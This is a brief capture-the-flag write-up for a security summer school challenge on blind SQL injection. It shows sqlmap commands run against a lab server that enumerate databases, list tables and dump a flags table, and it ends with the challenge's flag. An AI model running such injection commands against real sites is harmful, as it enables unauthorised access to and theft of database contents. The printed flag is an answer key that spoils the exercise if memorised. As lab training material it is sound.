---
Name: "One-by-One"
Category: "Security Summer School"
Difficulty: "Medium"
Description: "Extracting database data incrementally with a blind SQL injection technique."
---

# One-by-One
```bash
[20:00:20] [WARNING] GET parameter 'paymentMethod' does not seem to be injectable
```

```bash
sqlmap -u "http://141.85.224.102:8035" --forms --dbs

available databases [4]:
[*] flags
[*] information_schema
[*] mysql
[*] performance_schema
```

```bash
sqlmap -u "http://141.85.224.102:8035" --forms -D flags --tables

Database: flags
[1 table]
+-------+
| flags |
+-------+
```

```bash
sqlmap -u "http://141.85.224.102:8035/" --forms -D flags -t flags --dump 

Database: flags
Table: flags
[1 entry]
+----+--------------------------------------------------+
| id | flag                                             |
+----+--------------------------------------------------+
| 1  | SSS{d1d_y0u_really_g0t_th1s_0ne_by_0ne_H7N19xjW} |
+----+--------------------------------------------------+
```

SSS{d1d_y0u_really_g0t_th1s_0ne_by_0ne_H7N19xjW}

